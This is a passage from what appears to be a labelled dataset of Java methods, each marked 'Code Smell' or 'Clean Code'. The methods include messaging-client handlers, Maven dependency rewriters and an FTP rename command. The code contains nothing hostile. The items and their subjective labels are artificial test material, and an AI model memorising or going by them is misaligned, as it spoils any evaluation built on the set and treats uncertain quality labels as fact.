    return float.class;
  }
  if (type.equals(DATATYPE_L_BYTE)) {
    return byte.class;
  }
  if (type.equals(DATATYPE_L_CHAR)) {
    return char.class;
  }
  if (type.equals(DATATYPE_L_BOOLEAN)) {
    return boolean.class;
  }
  return loadClass(type);
}
",1,Code Smell
"@Override public Xml visitTag(Xml.Tag tag,ExecutionContext ctx){
  Xml.Tag t=(Xml.Tag)super.visitTag(tag,ctx);
  if (isDependencyTag(oldGroupId,oldArtifactId)) {
    String groupId=newGroupId;
    if (groupId != null) {
      t=changeChildTagValue(t,""groupId"",groupId,ctx);
    }
 else {
      groupId=t.getChildValue(""groupId"").orElseThrow(NoSuchElementException::new);
    }
    String artifactId=newArtifactId;
    if (artifactId != null) {
      t=changeChildTagValue(t,""artifactId"",artifactId,ctx);
    }
 else {
      artifactId=t.getChildValue(""artifactId"").orElseThrow(NoSuchElementException::new);
    }
    String currentVersion=t.getChildValue(""version"").orElse(null);
    if (newVersion != null) {
      try {
        String resolvedNewVersion=resolveSemverVersion(ctx,groupId,artifactId,currentVersion);
        Optional<Xml.Tag> scopeTag=t.getChild(""scope"");
        Scope scope=scopeTag.map(xml -> Scope.fromName(xml.getValue().orElse(""compile""))).orElse(Scope.Compile);
        Optional<Xml.Tag> versionTag=t.getChild(""version"");
        boolean configuredToOverrideManageVersion=overrideManagedVersion != null && overrideManagedVersion;
        boolean configuredToChangeManagedDependency=changeManagedDependency == null || changeManagedDependency;
        boolean versionTagPresent=versionTag.isPresent();
        boolean oldDependencyManaged=isDependencyManaged(scope,oldGroupId,oldArtifactId);
        boolean newDependencyManaged=isDependencyManaged(scope,groupId,artifactId);
        if (versionTagPresent) {
          if (!configuredToOverrideManageVersion && newDependencyManaged || (oldDependencyManaged && configuredToChangeManagedDependency)) {
            t=(Xml.Tag)new RemoveContentVisitor<>(versionTag.get(),false).visit(t,ctx);
          }
 else {
            t=changeChildTagValue(t,""version"",resolvedNewVersion,ctx);
          }
        }
 else         if (configuredToOverrideManageVersion || !newDependencyManaged) {
          Xml.Tag newVersionTag=Xml.Tag.build(""<version>"" + resolvedNewVersion + ""</version>"");
          t=(Xml.Tag)new AddToTagVisitor<ExecutionContext>(t,newVersionTag,new MavenTagInsertionComparator(t.getChildren())).visitNonNull(t,ctx,getCursor().getParent());
        }
      }
 catch (      MavenDownloadingException e) {
        return e.warn(tag);
      }
    }
    if (t != tag) {
      maybeUpdateModel();
    }
  }
  return t;
}
",1,Code Smell
"private void appendManifest(DashManifest newManifest){
  if (newManifest == null) {
    return;
  }
  if (getFirstSegmentNum(newManifest) == 0) {
    mOldManifest=newManifest;
    mOldSegmentNum=getLastSegmentNum(newManifest);
    return;
  }
  long newSegmentNum=getLastSegmentNum(newManifest);
  if (mOldManifest == null) {
    Period newPeriod=newManifest.getPeriod(0);
    Helpers.setField(newPeriod,""startMs"",0);
    mOldSegmentNum=newSegmentNum;
    for (int i=0; i < newPeriod.adaptationSets.size(); i++) {
      for (int j=0; j < newPeriod.adaptationSets.get(i).representations.size(); j++) {
        MultiSegmentRepresentation representation=(MultiSegmentRepresentation)newPeriod.adaptationSets.get(i).representations.get(j);
        SegmentList newSegmentList=(SegmentList)Helpers.getField(representation,""segmentBase"");
        Helpers.setField(newSegmentList,""presentationTimeOffset"",0);
        Helpers.setField(newSegmentList,""startNumber"",0);
      }
    }
    mOldManifest=newManifest;
    return;
  }
  Period oldPeriod=mOldManifest.getPeriod(0);
  Period newPeriod=newManifest.getPeriod(0);
  for (int i=0; i < oldPeriod.adaptationSets.size(); i++) {
    for (int j=0; j < oldPeriod.adaptationSets.get(i).representations.size(); j++) {
      appendRepresentation(oldPeriod.adaptationSets.get(i).representations.get(j),newPeriod.adaptationSets.get(i).representations.get(j),newSegmentNum - mOldSegmentNum);
    }
  }
  mOldSegmentNum=newSegmentNum;
}",1,Code Smell
"public void processEditedMessages(LongSparseArray<ArrayList<MessageObject>> editedMessages){
  if (editedMessages.size() == 0) {
    return;
  }
  ArrayList<MessageObject> popupArrayAdd=new ArrayList<>(0);
  notificationsQueue.postRunnable(() -> {
    boolean updated=false;
    for (int a=0, N=editedMessages.size(); a < N; a++) {
      long dialogId=editedMessages.keyAt(a);
      ArrayList<MessageObject> messages=editedMessages.valueAt(a);
      for (int b=0, N2=messages.size(); b < N2; b++) {
        MessageObject messageObject=messages.get(b);
        long did;
        if (messageObject.messageOwner.peer_id.channel_id != 0) {
          did=-messageObject.messageOwner.peer_id.channel_id;
        }
 else {
          did=0;
        }
        SparseArray<MessageObject> sparseArray=pushMessagesDict.get(did);
        if (sparseArray == null) {
          break;
        }
        MessageObject oldMessage=sparseArray.get(messageObject.getId());
        if (oldMessage != null && oldMessage.isReactionPush) {
          oldMessage=null;
        }
        if (oldMessage != null) {
          updated=true;
          sparseArray.put(messageObject.getId(),messageObject);
          int idx=pushMessages.indexOf(oldMessage);
          if (idx >= 0) {
            pushMessages.set(idx,messageObject);
          }
          idx=delayedPushMessages.indexOf(oldMessage);
          if (idx >= 0) {
            delayedPushMessages.set(idx,messageObject);
          }
        }
      }
    }
    if (updated) {
      showOrUpdateNotification(false);
    }
  }
);
}",1,Code Smell
"/** 
 * compare proxy list
 * @param proxyEntry
 */
private void compareProxyList(ProxyConfigEntry proxyEntry){
  if (proxyEntry != null) {
    LOGGER.info(""{}"",proxyEntry.toString());
    if (proxyEntry.getSize() != 0) {
      clientManager.setLoadThreshold(proxyEntry.getLoad());
      List<HostInfo> newProxyInfoList=new ArrayList<HostInfo>();
      for (      Map.Entry<String,HostInfo> entry : proxyEntry.getHostMap().entrySet()) {
        newProxyInfoList.add(entry.getValue());
      }
      String newMd5=calcHostInfoMd5(newProxyInfoList);
      String oldMd5=calcHostInfoMd5(proxyInfoList);
      if (newMd5 != null && !newMd5.equals(oldMd5)) {
        LOGGER.info(""old md5 {} new md5 {}"",oldMd5,newMd5);
        proxyInfoList.clear();
        proxyInfoList=newProxyInfoList;
        clientManager.setProxyInfoList(proxyInfoList);
        doworkTime=System.currentTimeMillis();
      }
 else       if (proxyEntry.getSwitchStat() != oldStat) {
        oldStat=proxyEntry.getSwitchStat();
        if ((System.currentTimeMillis() - doworkTime) > 3 * 60 * 1000) {
          LOGGER.info(""switch the cluster!"");
          proxyInfoList.clear();
          proxyInfoList=newProxyInfoList;
          clientManager.setProxyInfoList(proxyInfoList);
        }
 else {
          LOGGER.info(""only change oldStat "");
        }
      }
 else {
        newProxyInfoList.clear();
        LOGGER.info(""proxy IP list doesn't change, load {}"",proxyEntry.getLoad());
      }
      if (clientConfig.getLoadBalance() == LoadBalance.CONSISTENCY_HASH) {
        updateHashRing(proxyInfoList);
      }
    }
 else {
      LOGGER.error(""proxyEntry's size is zero"");
    }
  }
}",1,Code Smell
"@Override public void execute(@NonNull final LauncherAppState app,@NonNull final BgDataModel dataModel,@NonNull final AllAppsList apps){
  final Context context=app.getContext();
  ArrayList<WorkspaceItemInfo> matchingWorkspaceItems=new ArrayList<>();
synchronized (dataModel) {
    dataModel.forAllWorkspaceItemInfos(mUser,si -> {
      if ((si.itemType == LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT) && mPackageName.equals(si.getIntent().getPackage())) {
        matchingWorkspaceItems.add(si);
      }
    }
);
  }
  if (!matchingWorkspaceItems.isEmpty()) {
    if (mShortcuts.isEmpty()) {
      if (!new PackageManagerHelper(app.getContext()).isAppInstalled(mPackageName,mUser)) {
        return;
      }
    }
    List<String> allLauncherKnownIds=matchingWorkspaceItems.stream().map(WorkspaceItemInfo::getDeepShortcutId).distinct().collect(Collectors.toList());
    List<ShortcutInfo> shortcuts=new ShortcutRequest(context,mUser).forPackage(mPackageName,allLauncherKnownIds).query(ShortcutRequest.ALL);
    Set<String> nonPinnedIds=new HashSet<>(allLauncherKnownIds);
    ArrayList<WorkspaceItemInfo> updatedWorkspaceItemInfos=new ArrayList<>();
    for (    ShortcutInfo fullDetails : shortcuts) {
      if (!fullDetails.isPinned()) {
        continue;
      }
      String sid=fullDetails.getId();
      nonPinnedIds.remove(sid);
      matchingWorkspaceItems.stream().filter(itemInfo -> sid.equals(itemInfo.getDeepShortcutId())).forEach(workspaceItemInfo -> {
        workspaceItemInfo.updateFromDeepShortcutInfo(fullDetails,context);
        app.getIconCache().getShortcutIcon(workspaceItemInfo,fullDetails);
        updatedWorkspaceItemInfos.add(workspaceItemInfo);
      }
);
    }
    bindUpdatedWorkspaceItems(updatedWorkspaceItemInfos);
    if (!nonPinnedIds.isEmpty()) {
      deleteAndBindComponentsRemoved(ItemInfoMatcher.ofShortcutKeys(nonPinnedIds.stream().map(id -> new ShortcutKey(mPackageName,mUser,id)).collect(Collectors.toSet())),""removed because the shortcut is no longer available in shortcut service"");
    }
  }
  if (mUpdateIdMap) {
    dataModel.updateDeepShortcutCounts(mPackageName,mUser,mShortcuts);
    bindDeepShortcuts(dataModel);
  }
}
",1,Code Smell
"@Override public void getSnap(String deviceId,String channelId,String fileName,ErrorCallback errorCallback){
  Device device=deviceService.getDevice(deviceId);
  if (device == null) {
    errorCallback.run(InviteErrorCode.ERROR_FOR_PARAMETER_ERROR.getCode(),InviteErrorCode.ERROR_FOR_PARAMETER_ERROR.getMsg(),null);
    return;
  }
  InviteInfo inviteInfo=inviteStreamService.getInviteInfoByDeviceAndChannel(InviteSessionType.PLAY,deviceId,channelId);
  if (inviteInfo != null) {
    if (inviteInfo.getStreamInfo() != null) {
      MediaServer mediaServerItemInuse=mediaServerService.getOne(inviteInfo.getStreamInfo().getMediaServerId());
      String streamUrl;
      if (mediaServerItemInuse.getRtspPort() != 0) {
        streamUrl=String.format(""rtsp://127.0.0.1:%s/%s/%s"",mediaServerItemInuse.getRtspPort(),""rtp"",inviteInfo.getStreamInfo().getStream());
      }
 else {
        streamUrl=String.format(""http://127.0.0.1:%s/%s/%s.live.mp4"",mediaServerItemInuse.getHttpPort(),""rtp"",inviteInfo.getStreamInfo().getStream());
      }
      String path=""snap"";
      logger.info(""[璇锋眰鎴浘]: "" + fileName);
      mediaServerService.getSnap(mediaServerItemInuse,streamUrl,15,1,path,fileName);
      File snapFile=new File(path + File.separator + fileName);
      if (snapFile.exists()) {
        errorCallback.run(InviteErrorCode.SUCCESS.getCode(),InviteErrorCode.SUCCESS.getMsg(),snapFile.getAbsoluteFile());
      }
 else {
        errorCallback.run(InviteErrorCode.FAIL.getCode(),InviteErrorCode.FAIL.getMsg(),null);
      }
      return;
    }
  }
  MediaServer newMediaServerItem=getNewMediaServerItem(device);
  play(newMediaServerItem,deviceId,channelId,null,(code,msg,data) -> {
    if (code == InviteErrorCode.SUCCESS.getCode()) {
      InviteInfo inviteInfoForPlay=inviteStreamService.getInviteInfoByDeviceAndChannel(InviteSessionType.PLAY,deviceId,channelId);
      if (inviteInfoForPlay != null && inviteInfoForPlay.getStreamInfo() != null) {
        getSnap(deviceId,channelId,fileName,errorCallback);
      }
 else {
        errorCallback.run(InviteErrorCode.FAIL.getCode(),InviteErrorCode.FAIL.getMsg(),null);
      }
    }
 else {
      errorCallback.run(InviteErrorCode.FAIL.getCode(),InviteErrorCode.FAIL.getMsg(),null);
    }
  }
);
}",1,Code Smell
"public void deleteSavedDialog(long did){
  deleteSavedDialog(did,0);
}
protected void deleteSavedDialog(long did,int input_max_id){
  int[] max_id=new int[]{input_max_id};
  Runnable perform=() -> {
    getMessagesStorage().deleteSavedDialog(did);
    TLRPC.TL_messages_deleteSavedHistory req=new TLRPC.TL_messages_deleteSavedHistory();
    req.peer=getInputPeer(did);
    if (input_max_id == 0) {
      SavedMessagesController.SavedDialog dialog=null;
      for (int i=0; i < getSavedMessagesController().allDialogs.size(); ++i) {
        if (getSavedMessagesController().allDialogs.get(i).dialogId == did) {
          dialog=getSavedMessagesController().allDialogs.get(i);
          break;
        }
      }
      if (dialog != null) {
        max_id[0]=Math.max(max_id[0],dialog.top_message_id);
        getSavedMessagesController().deleteDialog(did);
      }
      req.max_id=max_id[0] <= 0 ? Integer.MAX_VALUE : max_id[0];
    }
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (error == null) {
        TLRPC.TL_messages_affectedHistory res=(TLRPC.TL_messages_affectedHistory)response;
        if (res.offset > 0) {
          deleteSavedDialog(did,max_id[0]);
        }
        processNewDifferenceParams(-1,res.pts,-1,res.pts_count);
        getMessagesStorage().onDeleteQueryComplete(did);
      }
    }
,ConnectionsManager.RequestFlagInvokeAfter);
  }
;
  if (max_id[0] <= 0) {
    getMessagesStorage().getSavedDialogMaxMessageId(did,(param) -> {
      max_id[0]=param;
      perform.run();
    }
);
  }
 else {
    perform.run();
  }
}",1,Code Smell
"protected String getSqlServerUpdateSql(List<String> columns,Map<String,List<String>> upsertKeys,String[] shardKeys,String targetTable,String sourceTable){
  List<String> pkCols=new ArrayList<>();
  for (  Map.Entry<String,List<String>> entry : upsertKeys.entrySet()) {
    pkCols.addAll(entry.getValue());
  }
  String prefixLeft=StringUtils.isBlank(targetTable) ? """" : quoteTable(targetTable) + ""."";
  String prefixRight=StringUtils.isBlank(sourceTable) ? """" : quoteTable(sourceTable) + ""."";
  List<String> list=new ArrayList<>();
  boolean isPk=false;
  boolean isShardKey=false;
  for (  String col : columns) {
    for (    String pkCol : pkCols) {
      if (pkCol.equalsIgnoreCase(col)) {
        isPk=true;
        break;
      }
    }
    for (    String shardKey : shardKeys) {
      if (shardKey.equalsIgnoreCase(col)) {
        isShardKey=true;
        break;
      }
    }
    if (isPk || isShardKey) {
      isPk=false;
      isShardKey=false;
      continue;
    }
    list.add(prefixLeft + quoteColumn(col) + ""=""+ prefixRight+ quoteColumn(col));
    isPk=false;
  }
  return StringUtils.join(list,"","");
}
",1,Code Smell
"public void setCustomChatReactions(long chatId,int type,List<TLRPC.Reaction> reactions,int reactionsCount,Utilities.Callback<TLRPC.TL_error> onError,Runnable onSuccess){
  TLRPC.TL_messages_setChatAvailableReactions req=new TLRPC.TL_messages_setChatAvailableReactions();
  req.peer=getInputPeer(-chatId);
  if (type == ChatReactionsEditActivity.SELECT_TYPE_NONE || reactions.isEmpty()) {
    req.available_reactions=new TLRPC.TL_chatReactionsNone();
  }
 else   if (type == ChatReactionsEditActivity.SELECT_TYPE_ALL) {
    req.available_reactions=new TLRPC.TL_chatReactionsAll();
  }
 else {
    TLRPC.TL_chatReactionsSome someReactions=new TLRPC.TL_chatReactionsSome();
    req.available_reactions=someReactions;
    someReactions.reactions.addAll(reactions);
  }
  req.flags|=1;
  req.reactions_limit=reactionsCount;
  getConnectionsManager().sendRequest(req,(response,error) -> {
    if (response != null) {
      processUpdates((TLRPC.Updates)response,false);
      TLRPC.ChatFull full=getChatFull(chatId);
      if (full != null) {
        if (full instanceof TLRPC.TL_chatFull) {
          full.flags|=262144;
        }
        if (full instanceof TLRPC.TL_channelFull) {
          full.flags|=1073741824;
        }
        full.available_reactions=req.available_reactions;
        getMessagesStorage().updateChatInfo(full,false);
      }
      AndroidUtilities.runOnUIThread(() -> {
        if (onSuccess != null) {
          onSuccess.run();
        }
        getNotificationCenter().postNotificationName(NotificationCenter.chatAvailableReactionsUpdated,chatId,0L);
      }
);
    }
 else {
      AndroidUtilities.runOnUIThread(() -> {
        if (onError != null) {
          onError.run(error);
        }
      }
);
    }
  }
);
  TLRPC.ChatFull chatFull=getChatFull(chatId);
  if (chatFull != null) {
    if (chatFull instanceof TLRPC.TL_channelFull) {
      chatFull.flags2|=8192;
    }
 else {
      chatFull.flags|=1048576;
    }
    chatFull.reactions_limit=reactionsCount;
    getMessagesStorage().updateChatInfo(chatFull,false);
  }
}",1,Code Smell
"/** 
 * Get byte array from an InputStream most efficiently. Taken from sun.misc.IOUtils
 * @param is      InputStream
 * @param length  Length of the buffer, -1 to read the whole stream
 * @param readAll Whether to read the whole stream
 * @return Desired byte array
 * @throws IOException If maximum capacity exceeded.
 */
@AnyThread public static byte[] readFully(@NonNull InputStream is,int length,boolean readAll) throws IOException {
  byte[] output={};
  if (length == -1)   length=Integer.MAX_VALUE;
  int pos=0;
  while (pos < length) {
    int bytesToRead;
    if (pos >= output.length) {
      bytesToRead=Math.min(length - pos,output.length + 1024);
      if (output.length < pos + bytesToRead) {
        output=Arrays.copyOf(output,pos + bytesToRead);
      }
    }
 else {
      bytesToRead=output.length - pos;
    }
    int cc=is.read(output,pos,bytesToRead);
    if (cc < 0) {
      if (readAll && length != Integer.MAX_VALUE) {
        throw new EOFException(""Detect premature EOF"");
      }
 else {
        if (output.length != pos) {
          output=Arrays.copyOf(output,pos);
        }
        break;
      }
    }
    pos+=cc;
  }
  return output;
}",1,Code Smell
"/** 
 * Fills the result queue by processing the files and directories from fileStack.
 */
private void populateResults(){
  while (!depthStack.isEmpty() && resultQueue.isEmpty()) {
    DepthControl currentDepthControl=depthStack.pop();
    File currentFile=currentDepthControl.getFile();
    int currentDepth=currentDepthControl.getDepth();
    if (yieldFilter.apply(currentFile)) {
      if (currentFile.isDirectory() && dirFilter.apply(currentFile)) {
        if (branchFilter.apply(currentFile) && currentDepth < maxDepth) {
          File[] subFiles=currentFile.listFiles();
          if (subFiles != null) {
            for (            File f : subFiles) {
              depthStack.add(new DepthControl(currentDepth + 1,f));
            }
          }
        }
      }
 else       if (currentFile.isFile() && fileFilter.apply(currentFile)) {
        resultQueue.offer(currentFile);
      }
    }
  }
}",1,Code Smell
"@Override public void run(){
  Cat.d(""RNTO executing"");
  String param=getParameter(input);
  String errString=null;
  File toFile=null;
  mainblock: {
    toFile=inputPathToChrootedFile(sessionThread.getChrootDir(),sessionThread.getWorkingDir(),param);
    Cat.i(""RNTO to file: "" + toFile.getPath());
    if (violatesChroot(toFile)) {
      errString=""550 Invalid name or chroot violation\r\n"";
      break mainblock;
    }
    File fromFile=sessionThread.getRenameFrom();
    if (fromFile == null) {
      errString=""550 Rename error, maybe RNFR not sent\r\n"";
      break mainblock;
    }
    Cat.i(""RNTO from file: "" + fromFile.getPath());
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
      File tmpFile=null;
      try {
        tmpFile=File.createTempFile(""temp_"" + fromFile.getName(),null,sessionThread.getWorkingDir());
        if (fromFile.isDirectory()) {
          String tmpFilePath=tmpFile.getPath();
          tmpFile.delete();
          tmpFile=new File(tmpFilePath);
        }
      }
 catch (      IOException e) {
        e.printStackTrace();
        errString=""550 Error during rename operation\r\n"";
        break mainblock;
      }
      if (!fromFile.renameTo(tmpFile)) {
        errString=""550 Error during rename operation\r\n"";
        break mainblock;
      }
      fromFile.delete();
      if (!tmpFile.renameTo(toFile)) {
        errString=""550 Error during rename operation\r\n"";
        break mainblock;
      }
    }
 else {
      if (fromFile.isDirectory()) {
        FileUtil.renameFolder(fromFile,toFile,UUtils.getContext());
      }
 else {
        FileUtil.moveFile(fromFile,toFile,UUtils.getContext());
      }
    }
  }
  if (errString != null) {
    sessionThread.writeString(errString);
    Cat.i(""RNFR failed: "" + errString.trim());
  }
 else {
    sessionThread.writeString(""250 rename successful\r\n"");
  }
  sessionThread.setRenameFrom(null);
  Cat.d(""RNTO finished"");
}",1,Code Smell
"@Override public void handler(UserRegisterReqDTO requestParam){
  if (Objects.isNull(requestParam.getUsername())) {
    throw new ClientException(UserRegisterErrorCodeEnum.USER_NAME_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getPassword())) {
    throw new ClientException(UserRegisterErrorCodeEnum.PASSWORD_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getPhone())) {
    throw new ClientException(UserRegisterErrorCodeEnum.PHONE_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getIdType())) {
    throw new ClientException(UserRegisterErrorCodeEnum.ID_TYPE_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getIdCard())) {
    throw new ClientException(UserRegisterErrorCodeEnum.ID_CARD_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getMail())) {
    throw new ClientException(UserRegisterErrorCodeEnum.MAIL_NOTNULL);
  }
 else   if (Objects.isNull(requestParam.getRealName())) {
    throw new ClientException(UserRegisterErrorCodeEnum.REAL_NAME_NOTNULL);
  }
}
",0,Clean Code
"@Test public void testUserPaginationWithSameTimeJoined() throws Exception {
  if (StorageLayer.getBaseStorage(process.main).getType() != STORAGE_TYPE.SQL) {
    return;
  }
  ThirdPartySQLStorage storage=(ThirdPartySQLStorage)StorageLayer.getBaseStorage(process.getProcess());
  Set<String> userIds=new HashSet<>();
  long timeJoined=System.currentTimeMillis();
  for (int i=0; i < 100; i++) {
    String userId=io.supertokens.utils.Utils.getUUID();
    storage.signUp(TenantIdentifier.BASE_TENANT,userId,""test"" + i + ""@example.com"",new LoginMethod.ThirdParty(""google"",userId),timeJoined);
    userIds.add(userId);
  }
{
    Set<String> paginationUserIds=new HashSet<>();
    UserPaginationContainer usersRes=AuthRecipe.getUsers(process.getProcess(),10,""ASC"",null,null,null);
    while (true) {
      for (      AuthRecipeUserInfo user : usersRes.users) {
        paginationUserIds.add(user.getSupertokensUserId());
      }
      if (usersRes.nextPaginationToken == null) {
        break;
      }
      usersRes=AuthRecipe.getUsers(process.getProcess(),10,""ASC"",usersRes.nextPaginationToken,null,null);
    }
    assertEquals(userIds.size(),paginationUserIds.size());
    assertEquals(userIds,paginationUserIds);
  }
{
    Set<String> paginationUserIds=new HashSet<>();
    UserPaginationContainer usersRes=AuthRecipe.getUsers(process.getProcess(),10,""DESC"",null,null,null);
    while (true) {
      for (      AuthRecipeUserInfo user : usersRes.users) {
        paginationUserIds.add(user.getSupertokensUserId());
      }
      if (usersRes.nextPaginationToken == null) {
        break;
      }
      usersRes=AuthRecipe.getUsers(process.getProcess(),10,""DESC"",usersRes.nextPaginationToken,null,null);
    }
    assertEquals(userIds.size(),paginationUserIds.size());
    assertEquals(userIds,paginationUserIds);
  }
}",1,Code Smell
"public static String shortestEnd(String s){
  if (s == null || s.length() == 0) {
    return null;
  }
  char[] str=manacherString(s);
  int[] pArr=new int[str.length];
  int C=-1;
  int R=-1;
  int maxContainsEnd=-1;
  for (int i=0; i != str.length; i++) {
    pArr[i]=R > i ? Math.min(pArr[2 * C - i],R - i) : 1;
    while (i + pArr[i] < str.length && i - pArr[i] > -1) {
      if (str[i + pArr[i]] == str[i - pArr[i]])       pArr[i]++;
 else {
        break;
      }
    }
    if (i + pArr[i] > R) {
      R=i + pArr[i];
      C=i;
    }
    if (R == str.length) {
      maxContainsEnd=pArr[i];
      break;
    }
  }
  char[] res=new char[s.length() - maxContainsEnd + 1];
  for (int i=0; i < res.length; i++) {
    res[res.length - 1 - i]=str[i * 2 + 1];
  }
  return String.valueOf(res);
}",1,Code Smell
"private void requestIsUserPremiumBlocked(){
  if (loadingIsUserPremiumBlocked.isEmpty())   return;
  TLRPC.TL_users_getIsPremiumRequiredToContact req=new TLRPC.TL_users_getIsPremiumRequiredToContact();
  final ArrayList<Long> ids=new ArrayList<>();
  for (  long userId : loadingIsUserPremiumBlocked) {
    TLRPC.InputUser inputUser=getInputUser(userId);
    if (inputUser != null) {
      req.id.add(inputUser);
      ids.add(userId);
    }
  }
  loadingIsUserPremiumBlocked.clear();
  if (req.id.isEmpty()) {
    return;
  }
  getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    boolean changed=false;
    if (res instanceof TLRPC.Vector) {
      ArrayList<Object> objects=((TLRPC.Vector)res).objects;
      for (int i=0; i < Math.min(ids.size(),objects.size()); ++i) {
        long userId=ids.get(i);
        boolean blocked=objects.get(i) instanceof TLRPC.TL_boolTrue;
        Boolean pastBlocked=cachedIsUserPremiumBlocked.get(userId);
        if (pastBlocked == null || pastBlocked != blocked) {
          cachedIsUserPremiumBlocked.put(userId,blocked);
          changed=true;
        }
        TLRPC.UserFull userFull=getUserFull(userId);
        if (userFull != null && userFull.contact_require_premium != blocked) {
          userFull.contact_require_premium=blocked;
          getMessagesStorage().updateUserInfo(userFull,true);
          changed=true;
        }
 else         if (userFull == null) {
          getMessagesStorage().updateUserInfoPremiumBlocked(userId,blocked);
          changed=true;
        }
      }
    }
    if (changed) {
      getNotificationCenter().postNotificationName(NotificationCenter.userIsPremiumBlockedUpadted);
    }
  }
));
}",1,Code Smell
"@Override public void paint(Graphics g){
  super.paint(g);
  g.setFont(mTextFont);
  Graphics2D graphics2D=(Graphics2D)g;
  if (mDumpModeWidth == 0) {
    mDumpModeWidth=graphics2D.getFontMetrics().stringWidth(""Dump Mode"");
  }
  if (mReleaseModeWidth == 0) {
    mReleaseModeWidth=graphics2D.getFontMetrics().stringWidth(""Release"");
  }
  graphics2D.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING,RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
  graphics2D.setRenderingHint(RenderingHints.KEY_ANTIALIASING,RenderingHints.VALUE_ANTIALIAS_ON);
  if (mCurrentMode == SearchableJTree.MODE_CONTROL && !mCurrentViewList.isEmpty()) {
    paintControlView(graphics2D);
  }
 else   if (mCurrentMode == SearchableJTree.MODE_SHIFT && !mCurrentViewList.isEmpty()) {
    paintShiftView(graphics2D);
    if (mRepaintByClick) {
      mRepaintByClick=false;
    }
  }
 else {
    paintClickView(graphics2D);
  }
  if (mApplication != null && !mApplication.isFromSdk()) {
    graphics2D.setColor(mCheckViewTextBgColor);
    graphics2D.fillRect(getWidth() - mDumpModeWidth - 2 * HALF_DRAW_TEXT_PADDING,0,mDumpModeWidth + 2 * HALF_DRAW_TEXT_PADDING,20);
    graphics2D.setColor(mNormalTextColor);
    graphics2D.drawString(""Dump Mode"",getWidth() - mDumpModeWidth - HALF_DRAW_TEXT_PADDING,15);
  }
 else   if (mApplication != null && !mApplication.isIsDebug()) {
    graphics2D.setColor(mCheckViewTextBgColor);
    graphics2D.fillRect(getWidth() - mReleaseModeWidth - 2 * HALF_DRAW_TEXT_PADDING,0,mReleaseModeWidth + 2 * HALF_DRAW_TEXT_PADDING,20);
    graphics2D.setColor(mNormalTextColor);
    graphics2D.drawString(""Release"",getWidth() - mReleaseModeWidth - HALF_DRAW_TEXT_PADDING,15);
  }
}",1,Code Smell
"@Override public void stopAndAnalyse(){
  started=false;
  Logger logger=LogUtils.getLoggerWithRollingFileAppender(LOGGER_PREFIX + ""logcat_"" + connectedDevice.getSerialNum(),loggerFilePath,""%logger{0}>> %m%n"");
  Process process=null;
  try {
    process=adbOperateUtil.executeDeviceCommandOnPC(connectedDevice,""logcat -d Finsky:S MirrorLink:S *:D"",infoLogger);
    try (BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(process.getInputStream(),StandardCharsets.UTF_8))){
      String line;
      boolean collectCrash=false;
      StringBuilder crashLines=new StringBuilder();
      while ((line=bufferedReader.readLine()) != null) {
        if (collectCrash) {
          if (!line.contains("" E "") && !line.contains("" F "")) {
            collectCrash=false;
          }
 else {
            if (line.contains(pkgName)) {
              crashLines.append(""<b>"").append(line).append(""</b>"").append(""\n"");
            }
 else {
              crashLines.append(line).append(""\n"");
            }
          }
        }
        if (line.contains(""beginning of crash"") || line.contains(""AndroidRuntime: FATAL EXCEPTION"")) {
          collectCrash=true;
        }
        logger.info(line);
      }
      if (crashLines.length() > 0) {
        testRun.setCrashStack(crashLines.toString());
        testRun.setCrashStackId(UUID.randomUUID().toString());
      }
    }
   }
 catch (  IOException e) {
    e.printStackTrace();
  }
 finally {
    if (process != null) {
      process.destroy();
    }
    LogUtils.releaseLogger(logger);
  }
}",1,Code Smell
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  J.ClassDeclaration classDecl=getCursor().firstEnclosing(J.ClassDeclaration.class);
  if (classDecl == null) {
    return m;
  }
  if (methodMatcher.matches(method,classDecl)) {
    J.Modifier.Type currentMethodAccessLevel=m.getModifiers().stream().map(J.Modifier::getType).filter(EXPLICIT_ACCESS_LEVELS::contains).findAny().orElse(null);
    if (currentMethodAccessLevel == newAccessLevel) {
      return m;
    }
    if (EXPLICIT_ACCESS_LEVELS.contains(currentMethodAccessLevel) && EXPLICIT_ACCESS_LEVELS.contains(newAccessLevel)) {
      m=m.withModifiers(ListUtils.map(m.getModifiers(),mod -> mod.getType() == currentMethodAccessLevel ? mod.withType(newAccessLevel) : mod));
    }
 else     if (currentMethodAccessLevel == null) {
      J.Modifier mod=new J.Modifier(Tree.randomId(),Space.build("" "",emptyList()),Markers.EMPTY,null,newAccessLevel,Collections.emptyList());
      m=m.withModifiers(ListUtils.concat(mod,m.getModifiers()));
      if (method.getModifiers().isEmpty()) {
        J.TypeParameters typeParams=m.getPadding().getTypeParameters();
        if (typeParams == null) {
          TypeTree returnExpr=m.getReturnTypeExpression();
          if (returnExpr == null) {
            m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),m.getName().getPrefix()));
            m=m.withName(m.getName().withPrefix(Space.format("" "")));
          }
 else {
            m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),returnExpr.getPrefix()));
            m=m.withReturnTypeExpression(returnExpr.withPrefix(Space.format("" "")));
          }
        }
 else {
          m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),typeParams.getPrefix()));
          m=m.getPadding().withTypeParameters(typeParams.withPrefix(Space.format("" "")));
        }
      }
 else {
        m=m.withModifiers(ListUtils.map(m.getModifiers(),(i,mod2) -> {
          if (i == 0) {
            return mod2.withPrefix(method.getModifiers().get(0).getPrefix());
          }
 else           if (i == 1) {
            return mod2.withPrefix(Space.format("" ""));
          }
          return mod2;
        }
));
      }
    }
 else     if (newAccessLevel == null) {
      final List<Comment> modifierComments=new ArrayList<>();
      List<J.Modifier> modifiers=ListUtils.map(m.getModifiers(),mod -> {
        if (mod.getType() == currentMethodAccessLevel) {
          modifierComments.addAll(mod.getComments());
          return null;
        }
